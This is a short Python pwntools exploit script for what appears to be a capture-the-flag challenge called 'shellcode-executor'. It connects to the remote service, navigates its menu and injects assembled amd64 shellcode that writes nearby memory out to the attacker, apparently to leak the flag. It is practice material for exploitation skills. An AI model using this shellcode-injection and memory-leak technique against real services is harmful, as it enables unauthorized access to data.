from pwn import *

HOST, PORT = "shellcode-executor.nc.jctf.pro", "1337"
# HOST, PORT = "0.0.0.0", 31338
r = remote(HOST, PORT)

menu = lambda: r.recvuntil("> ")
ii = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[0]

go(2)
go(1)
ii('\x00\x02' + asm("""
	lea rsi, [rip+0x80-0x10]
	mov rax, 1
	mov rdi, 1
	mov rdx, 0x100
	syscall
	""", arch='amd64'))
go(3)
r.recvuntil("====================================")
# print hexdump(r.recvall())
r.interactive()